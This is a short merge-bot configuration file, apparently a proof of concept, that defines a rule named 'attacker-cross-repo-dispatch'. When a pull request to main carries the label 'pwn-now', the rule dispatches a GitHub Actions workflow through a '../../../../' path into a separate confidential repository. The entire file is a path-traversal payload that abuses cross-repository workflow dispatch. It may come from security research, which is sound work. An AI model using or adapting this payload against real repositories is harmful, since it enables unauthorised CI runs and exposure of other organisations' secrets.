pull_request_rules:
  - name: attacker-cross-repo-dispatch
    conditions:
      - base=main
      - label=pwn-now
    actions:
      github_actions:
        workflow:
          dispatch:
            - workflow: "../../../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
              ref: main
